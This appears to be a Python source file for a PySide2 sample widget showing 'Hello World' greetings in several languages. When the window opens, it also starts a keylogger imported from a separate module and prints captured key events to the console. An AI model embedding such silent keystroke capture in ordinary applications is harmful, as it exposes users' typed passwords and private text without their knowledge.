import sys

import random

from PySide2 import QtWidgets, QtCore
from PySide2.QtCore import QObject, Signal, Slot
from background import BackgroundRunner
from keylogger import start_keylogger


class MyWidget(QtWidgets.QWidget):

    key_pressed_signal = Signal(str)

    def __init__(self):
        QtWidgets.QWidget.__init__(self)
        self.runner = BackgroundRunner()
        self.runner.start_jobs([start_keylogger], self.key_pressed_signal)
        self.runner.msg_signal.connect(self.get_events)
        # Sample code
        self.hello = ["Hallo Welt", "你好，世界", "Hei maailma",
            "Hola Mundo", "Привет мир"]
        self.button = QtWidgets.QPushButton("Click me!")
        self.text = QtWidgets.QLabel("Hello World")
        self.layout = QtWidgets.QVBoxLayout()
        self.layout.addWidget(self.text)
        self.layout.addWidget(self.button)
        self.setLayout(self.layout)
        self.button.clicked.connect(self.magic)

    @Slot(str)
    def get_events(self, event):
        print(event)

    def magic(self):
        self.text.setText(random.choice(self.hello))


if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    widget = MyWidget()
    widget.show()
    sys.exit(app.exec_())